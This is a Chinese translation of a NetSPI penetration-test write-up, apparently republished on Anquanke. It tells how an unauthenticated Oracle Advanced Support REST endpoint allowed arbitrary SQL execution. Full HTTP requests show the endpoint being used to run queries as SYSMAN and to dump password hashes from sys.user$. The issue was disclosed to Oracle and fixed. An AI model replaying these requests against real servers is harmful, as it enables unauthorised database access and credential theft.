# 【挖洞经验】Oracle Advanced Support系统SQL注入漏洞挖掘经验分享

阅读量 **235284**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2017-08-31 14:22:19

 **x**

##### 译文声明

本文是翻译文章，文章来源：netspi.com

原文地址：<https://blog.netspi.com/anonymous-sql-execution-oracle-advanced-support/
>

译文仅供参考，具体内容表达以及含义原文为准。

译者：[ **Carpediem**](http://bobao.360.cn/member/contribute?uid=2659563319)

预估稿费：170RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿

  

**Oracle Advanced Support系统SQL注入漏洞分析**

一年多前我在客户的一个外部环境中执行渗透测试，任何外部环境渗透测试的重要步骤之一就是挖掘出可访问的WEB服务。nmap和EveWitness的结合会令这步骤变得更快，因为我们可以进行端口扫描
并且把这些结果以屏幕截图的形式导入到 EyeWitness中。当梳理完 EyeWitness提供的屏幕截图页面后，我发现了一个Oracle 高级支持服务。

虽然我之前从没听过Oracle Advanced
Support,但是当我很快的google完之后，我了解到它似乎是一个允许oracle的技术支持在外部登入，并且在oracle系统环境下进行任何技术支持需要的操作的服务。有了这个信息之后，
我们可以将现有的web应用测试与它结合起来。

我们可以对这个应用开始进行一些简单的侦查，包括：

**寻找已经被爆出的漏洞**

**用burp爬取应用**

**枚举常见的路径**

**查看可获取的页面的源码**

幸运的是，我在主页的源码中发现了 一个包含资产目录清单的链接。

对于像这样一个未知的应用，目录列表是很有用的，它给我们了一些希望去发现一些很有趣 但不应该被访问到的东西
。果不其然的在搜寻每个目录之后，我偶然发现了以下的javascript文件：

让它变得更适合阅读一些

在Web渗透测试中，其中一个我喜欢的并且常常忽视的事情是查找应用中的javascript文件， 并且看看他们是否支持任何POST 或者是GET请求。

我们已经发现了一个叫做sql-service.js的javascript文件，这让我立刻在脑海中提高起警觉来。这个文件包含4个匿名函数其中三个t.getJSON方法的GET请求和一个t.post方法的POST请求。这些函数包含如下一些变量：

****

    
    
    getSqlData
    createNamedSql
    getNamedSqlList
    getSqlNameList

在这篇文章的剩余部分，我将提及匿名函数中的变量。

每个函数的根节点都位于/rest/data路径下。

接下来是将他们拆分之后的请求：

    
    
    GET /rest/data/sql
    POST /rest/data/sql
    GET /rest/data/sql_list
    GET /rest/data/sql_name_list

有了这些之后，开始拿出我最喜欢的代理工具:burp,看看会发生什么！

  

**直捣黄龙**

我首先尝试的是来自于getSqlData函数路径是/rest/data/sql的GET请求。我们也通过观察javascript发现这个请求需要附加一个参数，让我们在结尾加上”test”.

    
    
    HTTP Request:
    GET /rest/data/sql/test HTTP/1.1 Host: host Connection: close Accept: application/json;charset=UTF-8 Accept-Encoding: gzip, deflate, sdch Accept-Language: en-US,en;q=0.8 Content-Type: application/json Content-Length: 0 
    HTTP Response:
    HTTP/1.1 404 Not Found Content-Type: application/json Content-Length: 20 Connection: close Named SQL not found.

当我们把”test”加到请求url的末尾，服务器返回了404。同时服务器也返回了这样一个信息：Named SQL not
found。如果我们尝试”test”之外的其他字符串，得到了同样的返回信息。我们把这个请求发到Burp 的
intruder模块，打算试图过一个目录列表字典来枚举潜在的参数名，看看是否能得到除了404之外的返回。但是有一个更简单的方法来找到合适的参数名。如果我们再次查看javascript,你会发现函数的名称给我们一些有价值的信息。我们在以下函数中发现了两个GET请求：getNamedSqlList
和 getSqlNameList.。我们刚才的请求返回的错误信息是 Named SQL not found
error。让我们尝试针对getNamedSqlList函数的GET请求。

    
    
    HTTP Request:
    GET /rest/data/sql_list HTTP/1.1
    Host: host
    Connection: close
    Accept: application/json;charset=UTF-8
    Accept-Encoding: gzip, deflate, sdch
    Accept-Language: en-US,en;q=0.8
    Content-Type: application/json
    Content-Length: 0
    HTTP Response:
    HTTP/1.1 200 OK 
    Content-Type: application/json; charset=UTF-8
    Connection: close
    Content-Length: 243633
    [{"id":1,"name":"sample","sql":"SELECT TIME,CPU_UTILIZATION,MEMORY_UTILIZATION FROM TIME_REPORT where TIME > :time","dataSourceJNDI":"jdbc/portal","privileges":[],"paramList":[{"id":36,"name":"time","type":"date-time","value":null}]},{"id":2,"name":"cpu_only","sql":"SELECT TIME,CPU_UTILIZATION FROM TIME_REPORT","dataSourceJNDI":"jdbc/portal","privileges":[],"paramList":[]},{"id":3,"name":"simple_param","sql":"SELECT TIME,CPU_USAGE FROM CPU_MONITOR WHERE CPU_USAGE < ?","dataSourceJNDI":"jdbc/portal","privileges":[],"paramList":[{"id":1,"name":"cpu_usage","type":"int","value":null}]},{"id":4,"name":"double_param","sql":"SELECT TIME,CPU_USAGE FROM CPU_MONITOR WHERE CPU_USAGE between ? and ?","dataSourceJNDI":"jdbc/portal","privileges":[],"paramList":[{"id":2,"name":"cpu_low","type":"int","value":null},{"id":3,"name":"cpu_high","type":"int","value":null}]},{"id":5,"name":"by_time","sql":"select time, cpu_usage from CPU_MONITOR where time(time) > ?","dataSourceJNDI":"jdbc/portal","privileges":[],"paramList":[{"id":4,"name":"time","type":"string","value":null}]},{"id":10,"name":"tableTransferMethod","sql":"SELECT result_text, result_value FROM&nbsp;&nbsp; MIG_RPT_TABLE_TRANSFER_METHOD WHERE&nbsp; scenario_id = :scenario_id AND&nbsp; package_run_id = :pkg_run_id AND engagement_id = :engagement_id","dataSourceJNDI":"jdbc/acscloud","privileges":[],"paramList":[{"id":5,"name":"scenario_id","type":"int","value":null},{"id":6,"name":"pkg_run_id","type":"string","value":null},{"id":7,"name":"engagement_id","type":"int","value":null}]},{"id":16,"name":"dataTransferVolumes","sql":"select RESULT_TEXT,n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; RESULT_VALUEnfrom&nbsp; MIG_RPT_DATA_TRANSFER_VOLUMEnwhere scenario_id = :scenario_idnAND&nbsp;&nbsp; package_run_id = :pkg_run_idnAND&nbsp;&nbsp; engagement_id = :engagement_id","dataSourceJNDI":"jdbc/acscloud","privileges":[],"paramList":[{"id":8,"name":"scenario_id","type":"int","value":null},{"id":9,"name":"pkg_run_id","type":"string","value":null},{"id":10,"name":"engagement_id","type":"int","value":null}]},{"id":17,"name":"dataCompressionPercentage","sql":"SELECT RESULT_TEXT,n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; RESULT_VALUEnFROM&nbsp;&nbsp; MIG_RPT_DATA_COMPRESSION_PCTnWHERE&nbsp; scenario_id = :scenario_idnAND&nbsp;&nbsp;&nbsp; package_run_id = :pkg_run_idnAND engagement_id =
    …

这的确给了我们不少的信息，让我们仔细分析一下，我们获得了一组json对象，看一下数组中的第一个对象：

    
    
    {"id":1,"name":"sample","sql":"SELECT TIME,CPU_UTILIZATION,MEMORY_UTILIZATION FROM TIME_REPORT where TIME > :time","dataSourceJNDI":"jdbc/portal","privileges":[],"paramList":[{"id":36,"name":"time","type":"date-time","value":null}]}

我们发现了以下的属性：name, sql, dataSourceJNDI, privileges, and paramList，其中
sql属性是我最感兴趣的因为它包含了具有字符串值的SQL语句。我们把name的值放进先前尝试的GET请求中。

    
    
    HTTP Request:
    GET /rest/data/sql/sample HTTP/1.1
    Host: host
    Connection: close
    Accept: application/json;charset=UTF-8
    Accept-Encoding: gzip, deflate, sdch
    Accept-Language: en-US,en;q=0.8
    Content-Type: application/json;charset=UTF-8
    Content-Length: 0
    HTTP Response:
    HTTP/1.1 400 Bad Request 
    Content-Type: application/json
    Content-Length: 44
    Connection: close
    Bad Request.Param value not defined for time

Hey！我们得到一些返回！但是我们少了一个参数，让我们加进来。

    
    
    HTTP Request:
    GET /rest/data/sql/sample?time=1 HTTP/1.1
    Host: host
    Connection: close
    Accept: application/json;charset=UTF-8
    Accept-Encoding: gzip, deflate, sdch
    Accept-Language: en-US,en;q=0.8
    Content-Type: application/json;charset=UTF-8
    Content-Length: 0
    HTTP Response:
    HTTP/1.1 200 OK 
    Content-Type: application/json; charset=UTF-8
    Content-Length: 2
    Connection: close

虽然没有从服务器获得任何返回，但是也没有返回任何错误！难道是例子中的SQL语句被执行了，只是没有回显？我们可以继续尝试其他的从先前请求中获得的names，但是我们看一下原始的javascript。我们发现有一个叫做createNamedSQL的函数，它是一个POST的请求。我们知道来至于getNamedSqlList
的请求的返回值包含了sql语句的值。也许是这个post请求会允许我们在服务器上 执行sql查询。我们试一下！

  

**SQL Execution**

这就是createNamedSQL中在包体里面包含一个空json对象的POST请求：

    
    
    HTTP Request:
    POST /rest/data/sql HTTP/1.1
    Host: host
    Connection: close
    Accept: application/json;charset=UTF-8
    Accept-Encoding: gzip, deflate, sdch
    Accept-Language: en-US,en;q=0.8
    Content-Type: application/json
    Content-Length: 0
    {}
    HTTP Response:
    HTTP/1.1 500 Internal Server Error
    Content-Type: text/html
    Content-Length: 71
    Connection: close
    A system error has occurred: Column 'SQL_NAME' cannot be null [X64Q53Q]

我们得到一个关于SQL_NAME列的错误，当我们在包体中包含空的json对象时这不是很意外。现在我们在包体里加入一个随机的属性名和数值。

    
    
    HTTP Request:
    POST /rest/data/sql HTTP/1.1
    Host: host
    Connection: close
    Accept-Encoding: gzip, deflate, sdch
    Accept-Language: en-US,en;q=0.8
    Content-Length: 16
    Content-Type: application/json;charset=UTF-8
    {"test":1}
    HTTP Response:
    HTTP/1.1 400 Bad Request 
    Content-Type: text/plain
    Content-Length: 365
    Connection: close
    Unrecognized field "test" (class com.oracle.acs.gateway.model.NamedSQL), not marked as ignorable (6 known properties: "privileges", "id", "paramList", "name", "sql", "dataSourceJNDI"]) 
    &nbsp;at [Source: org.glassfish.jersey.message.internal.EntityInputStream@1c2f9d9d; line: 1, column: 14] (through reference chain: com.oracle.acs.gateway.model.NamedSQL["SQL_NAME"])

再一次不意外的获得了一个关于未知“test”字段的bad request，但是如果你注意的话，这个错误的信息给我们返回了一些有用的属性。感谢
Oracle先生的服务！这些属性也同样出现了从getNamedSqlList发出请求获得的返回中。我使用getNamedSqlList请求的返回中其中的一个值赋给dataSourceJNDI属性。

    
    
    HTTP Request:
    POST /rest/data/sql HTTP/1.1
    Host: host
    Connection: close
    Accept-Encoding: gzip, deflate, sdch
    Accept-Language: en-US,en;q=0.8
    Content-Length: 101
    Content-Type: application/json;charset=UTF-8
    {
        "name": "test",
        "sql":"select @@version",
        "dataSourceJNDI":"jdbc/portal"
    }

这看起来是一个很好的测试请求，我们来见证一下 他是否有效。

    
    
    HTTP Response:
    HTTP/1.1 500 Internal Server Error 
    Content-Type: text/plain
    Content-Length: 200
    Connection: close
    A system error has occurred: MessageBodyWriter not found for media type=text/plain, type=class com.oracle.acs.gateway.model.NamedSQL, genericType=class com.oracle.acs.gateway.model.NamedSQL. [S2VF2VI]

我们仍然从服务器获得了一个错误返回，但是只返回了content-type。SQL语句可能已经被创建了。通过把名称字段设为“test”,
让我们尝试第一个具有参数的GET请求。

    
    
    HTTP Request:
    GET /rest/data/sql/test HTTP/1.1
    Host: host
    Connection: close
    Accept: application/json;charset=UTF-8
    Accept-Encoding: gzip, deflate, sdch
    Accept-Language: en-US,en;q=0.8
    Content-Type: application/json;charset=UTF-8
    Content-Length: 0
    HTTP Response:
    HTTP/1.1 200 OK 
    Content-Type: application/json; charset=UTF-8
    Content-Length: 24
    Connection: close
    [{"@@version":"5.5.37"}]

看这里！我们获得了一些SQL执行。

看一下“我们”是谁。

    
    
    HTTP Request:
    POST /rest/data/sql HTTP/1.1
    Host: host
    Connection: close
    Accept: */*
    Accept-Encoding: gzip, deflate, sdch
    Accept-Language: en-US,en;q=0.8
    Content-Length: 101
    Content-Type: application/json;charset=UTF-8
    {
        "name": "test2",
        "sql":"SELECT USER from dual;",
        "dataSourceJNDI":"jdbc/portal"
    }
    HTTP Request:
    GET /rest/data/sql/test2 HTTP/1.1
    Host: host
    Connection: close
    Accept: application/json;charset=UTF-8
    Accept-Encoding: gzip, deflate, sdch
    Accept-Language: en-US,en;q=0.8
    Content-Type: application/json;charset=UTF-8
    Content-Length: 0
    HTTP Response:
    HTTP/1.1 200 OK 
    Content-Type: application/json; charset=UTF-8
    Content-Length: 19
    Connection: close
    [{"USER":"SYSMAN"}]

看起来我们是SYSMAN 用户。通过这个oracal
文档(https://docs.oracle.com/cd/B16351_01/doc/server.102/b14196/users_secure001.htm)
知道，我们就是administrator.

试一下 我们能否抓取出用户的哈希.

    
    
    HTTP Request:
    POST /rest/data/sql HTTP/1.1
    Host: host
    Connection: close
    Accept: */*
    Accept-Encoding: gzip, deflate, sdch
    Accept-Language: en-US,en;q=0.8
    Content-Length: 120
    Content-Type: application/json;charset=UTF-8
    {
        "name": "test3",
        "sql":"SELECT name, password FROM sys.user$",
        "dataSourceJNDI":"jdbc/portal"
    }
    HTTP Request:
    GET /rest/data/sql/test3 HTTP/1.1
    Host: host
    Connection: close
    Accept: application/json;charset=UTF-8
    Accept-Encoding: gzip, deflate, sdch
    Accept-Language: en-US,en;q=0.8
    Content-Type: application/json;charset=UTF-8
    Content-Length: 0
    HTTP Response:
    HTTP/1.1 200 OK 
    Content-Type: application/json; charset=UTF-8
    Content-Length: 5357
    Connection: close
    [{"NAME":"SYS","PASSWORD":"[REDACTED]"},{"NAME":"PUBLIC","PASSWORD":null},{"NAME":"CONNECT","PASSWORD":null},{"NAME":"RESOURCE","PASSWORD":null},{"NAME":"DBA","PASSWORD":null},{"NAME":"SYSTEM","PASSWORD":"[REDACTED]"},{"NAME":"SELECT_CATALOG_ROLE","PASSWORD":null},{"NAME":"EXECUTE_CATALOG_ROLE","PASSWORD":null}
    …

我们可以获得数据库中的用户密码的哈希值。我编辑和删除了主要的部分。知道了我们是一个具有administrator权限的用户，当然后续我们还可以做很多事情。然而，针对此博客的目的，我停止下来了。

**结论**

关于这个匿名sql执行我联系了oracle，他们很快的回复并且修复了这个问题。对我而言真正的问题是为什么web服务压根儿就允许sql语句被执行呢？

这个博客最大的收获是一定要看应用中的javascript文件。在多个web应用和外网的渗透测试中，我已经发现了隐藏在javascript文件中sql
注入，命令执行，和 xml实体注入攻击。

作为针对熟练渗透测试者的练习任务，看完这篇博客并且统计多少个你能确定的漏洞。提示：超过三处

**参考**

<https://github.com/ChrisTruncer/EyeWitness>

<https://nmap.org/>

<https://docs.oracle.com/cd/B16351_01/doc/server.102/b14196/users_secure001.htm>

<https://docs.oracle.com/cd/B28359_01/server.111/b28337/tdpsg_user_accounts.htm#TDPSG20000>

<https://portswigger.net/burp/help/repeater_using.html>

本文翻译自netspi.com [原文链接](https://blog.netspi.com/anonymous-sql-execution-oracle-advanced-support/ )。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Carpediem** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/86739](/post/id/86739)

安全客 - 有思想的安全新媒体

本文转载自: [netspi.com](https://blog.netspi.com/anonymous-sql-execution-oracle-advanced-support/ )

如若转载,请注明出处： <https://blog.netspi.com/anonymous-sql-execution-oracle-advanced-support/ >

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全知识](/tag/安全知识)

 **+1** __0赞

 __收藏

![](https://p5.ssl.qhmsg.com/dm/200_200_100/t0183051a464cd8430b.jpg) Carpediem

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

